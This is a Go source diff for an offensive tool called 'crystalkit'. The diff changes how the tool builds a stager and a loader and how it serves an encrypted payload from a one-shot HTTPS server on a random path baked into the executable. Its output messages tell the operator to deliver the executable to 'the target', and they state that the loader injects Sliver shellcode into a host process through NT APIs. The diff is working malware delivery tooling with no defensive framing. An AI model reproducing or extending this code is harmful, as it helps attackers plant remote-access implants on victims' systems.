@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 
 	"github.com/spf13/cobra"
@@ -273,21 +274,39 @@ func runStage(_ *cobra.Command, _ []string) error {
 		return fmt.Errorf("writing payload: %w", err)
 	}
 
-	stagerPath, err := stage.BuildStager(bundle, stageURL, stageOutput, stageGarble)
+	// When --serve: generate server early so the random path is known before
+	// compiling the stager. The stager URL must match the server path exactly.
+	effectiveURL := stageURL
+	var srv *stage.Server
+	if stageServe {
+		srv = stage.NewServer(bundle.Ciphertext, stagePort)
+		base, err := url.Parse(stageURL)
+		if err != nil {
+			return fmt.Errorf("invalid --url: %w", err)
+		}
+		effectiveURL = fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, srv.Path())
+	}
+
+	stagerPath, err := stage.BuildStager(bundle, effectiveURL, stageOutput, stageGarble)
 	if err != nil {
 		return fmt.Errorf("building stager: %w", err)
 	}
 
 	fmt.Printf("[+] payload  → %s\n", payloadPath)
 	fmt.Printf("[+] stager   → %s\n", stagerPath)
-	fmt.Printf("[+] url      → %s\n", stageURL)
-	fmt.Printf("[i] Deliver stager.exe to the target. Start serve before executing.\n")
 
 	if stageServe {
-		fmt.Printf("[*] Starting one-time HTTPS server on :%d …\n", stagePort)
-		srv := stage.NewServer(bundle.Ciphertext, stagePort)
+		fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", stagePort)
+		fmt.Printf("[+] Staging URL: %s\n", effectiveURL)
+		fmt.Printf("    (random path — baked into stager.exe, only this URL works)\n")
+		fmt.Printf("[i] Deliver stager.exe to the target.\n")
 		return srv.ListenAndServe()
 	}
+
+	fmt.Printf("[+] url      → %s\n", effectiveURL)
+	fmt.Printf("[i] Deliver stager.exe to the target.\n")
+	fmt.Printf("[i] Start the staging server: crystalkit serve --payload %s --port %d\n", payloadPath, stagePort)
+	fmt.Printf("[i] The URL printed by serve must match the --url you used here.\n")
 	return nil
 }
 
@@ -296,8 +315,10 @@ func runServe(_ *cobra.Command, _ []string) error {
 	if err != nil {
 		return fmt.Errorf("reading payload: %w", err)
 	}
-	fmt.Printf("[*] Serving %s on :%d (one download, then shutdown)\n", servePayload, servePort)
 	srv := stage.NewServer(data, servePort)
+	fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", servePort)
+	fmt.Printf("[+] Staging URL: https://<your-ip>:%d%s\n", servePort, srv.Path())
+	fmt.Printf("    Build your stager with: crystalkit stage --url https://<your-ip>:%d%s ...\n\n", servePort, srv.Path())
 	return srv.ListenAndServe()
 }
 
@@ -385,22 +406,38 @@ func runInject(_ *cobra.Command, _ []string) error {
 		return fmt.Errorf("writing payload: %w", err)
 	}
 
-	loaderPath, err := stage.BuildLoader(bundle, injectURL, injectOutput, injectGarble)
+	effectiveInjectURL := injectURL
+	var injectSrv *stage.Server
+	if injectServe {
+		injectSrv = stage.NewServer(bundle.Ciphertext, injectPort)
+		base, err := url.Parse(injectURL)
+		if err != nil {
+			return fmt.Errorf("invalid --url: %w", err)
+		}
+		effectiveInjectURL = fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, injectSrv.Path())
+	}
+
+	loaderPath, err := stage.BuildLoader(bundle, effectiveInjectURL, injectOutput, injectGarble)
 	if err != nil {
 		return fmt.Errorf("building loader: %w", err)
 	}
 
 	fmt.Printf("[+] payload  → %s\n", payloadPath)
 	fmt.Printf("[+] loader   → %s\n", loaderPath)
-	fmt.Printf("[+] url      → %s\n", injectURL)
 	fmt.Printf("[i] loader.exe injects Sliver shellcode into a host process via NT APIs.\n")
-	fmt.Printf("[i] Start serve before executing loader.exe on the target.\n")
 
 	if injectServe {
-		fmt.Printf("[*] Starting one-time HTTPS server on :%d …\n", injectPort)
-		srv := stage.NewServer(bundle.Ciphertext, injectPort)
-		return srv.ListenAndServe()
+		fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", injectPort)
+		fmt.Printf("[+] Staging URL: %s\n", effectiveInjectURL)
+		fmt.Printf("    (random path — baked into loader.exe, only this URL works)\n")
+		fmt.Printf("[i] Deliver loader.exe to the target.\n")
+		return injectSrv.ListenAndServe()
 	}
+
+	fmt.Printf("[+] url      → %s\n", effectiveInjectURL)
+	fmt.Printf("[i] Deliver loader.exe to the target.\n")
+	fmt.Printf("[i] Start the staging server: crystalkit serve --payload %s --port %d\n", payloadPath, injectPort)
+	fmt.Printf("[i] The URL printed by serve must match the --url you used here.\n")
 	return nil
 }
 
